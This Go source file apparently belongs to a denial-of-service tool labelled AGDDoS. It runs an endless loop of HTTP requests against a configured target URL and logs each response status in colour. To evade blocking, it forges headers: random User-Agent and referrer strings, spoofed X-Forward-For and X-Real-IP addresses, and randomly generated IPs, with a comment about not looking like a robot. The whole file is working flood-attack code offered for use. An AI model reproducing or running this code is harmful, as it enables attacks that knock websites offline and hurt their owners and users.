package main

import (
	"fmt"
	"io/ioutil"
	"log"
	"math/rand"
	"net/http"
	"runtime"
	"strings"
	"time"
)

func DoAttacking(grindex int) {
	for i := 0; ; i++ {
		if result, err := DoHttpRequest(); err != nil {
			PrintError(grindex, i, err.Error()) // Red. Client ERROR
			runtime.GC()                        // Clean up memory to prevent memory overflow
		} else {
			responseStatus := fmt.Sprintf("\033[1;32;40m (%s)", *result)                // Green. Status code is 200
			if !strings.Contains(*result, "200") && !strings.Contains(*result, "301") { // Status code is not 200/301
				responseStatus = fmt.Sprintf("\033[1;35;40m (%s)", *result) // Purple. Status code is 400/402/403/404/500/501/502/...
			}
			Log(grindex, i, responseStatus)
		}
		time.Sleep(time.Duration(IntervalMillisecond) * time.Millisecond)
		runtime.GC() // Clean up memory to prevent memory overflow
	}
}

func DoHttpRequest() (*string, error) {
	request, err := http.NewRequest(Method, TargetUrl, nil)
	if err != nil {
		return nil, err
	}
	// Make yourself don't look like a robot
	request.Header.Set("User-Agent", UserAgents[rand.Intn(len(UserAgents))])      // 生成伪UA
	request.Header.Set("Referrer", Refs[rand.Intn(len(Refs))])                    // 生成伪来源页面的地址
	request.Header.Set("Accept", "*/*")                                           // 接受所有
	request.Header.Set("Accept-encoding", "gzip, deflate, br")                    // 声明浏览器支持的编码类型
	request.Header.Set("Accept-language", "zh-CN,zh-TW;q=0.9")                    // 接受网页语言
	request.Header.Set("X-Forward-For", "186.240.156.78,1.4.72.237,"+genIpaddr()) // 多 层 代 理
	request.Header.Set("X-Real-IP", "186.240.156.78")                             // 多 层 代 理
	request.Header.Set("DDoS-Powered-By", "AGDDoS")

	response, err := DDosHttpClient.Do(request)
	if err != nil {
		return nil, err
	}
	defer response.Body.Close()
	// Ignore and read the responseBody
	_, _ = ioutil.ReadAll(response.Body)
	runtime.GC() // Clean up memory to prevent memory overflow
	return &response.Status, err
}

// This is used to generate random IP addresses
func genIpaddr() string {
	rand.Seed(time.Now().Unix())
	ip := fmt.Sprintf("%d.%d.%d.%d", rand.Intn(255), rand.Intn(255), rand.Intn(255), rand.Intn(255))
	return ip
}

func Log(grindex int, i int, responseStatus string) {
	log.Printf("[INFO][AGDDoS#%d/%d]%s \033[0m \n", grindex, i, responseStatus)
}

func PrintError(grindex int, i int, responseStatus string) {
	log.Printf("[Error][AGDDoS#%d/%d] \033[1;31;40m (%s) \033[0m \n", grindex, i, responseStatus)
}

func removeHttpAndHttps(url string) string {
	if strings.HasPrefix(url, "http://") {
		return url[7:]
	}
	if strings.HasPrefix(url, "https://") {
		return url[8:]
	}
	return url
}
